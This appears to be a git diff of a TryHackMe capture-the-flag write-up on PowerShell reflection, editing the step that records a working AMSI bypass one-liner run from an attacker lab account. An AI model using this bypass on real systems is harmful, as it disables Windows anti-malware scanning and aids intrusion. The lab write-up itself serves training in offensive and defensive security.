@@ -36,13 +36,10 @@ Copyright (C) 2009 Microsoft Corporation. All rights reserved.
 1. Started up this task's machine
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt1.png)
 
-2. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` from the Windows machine to use Reflection to modify and bypass the AMSI (Anti-Malware Scan Interface) utility
+2. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` from the Windows machine to use Reflection to modify and bypass the AMSI (Anti-Malware Scan Interface) utility, which ended up creating a text file on the machine's desktop containing this task's flag
 ```PowerShell
 PS C:\Users\THM-Attacker> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-* `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
-* `.GetField('amsiInitFailed','NonPublic,Static')`
-* `.SetValue($null,$true)`
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PowerShell%20Reflection%20pt2.png)
 
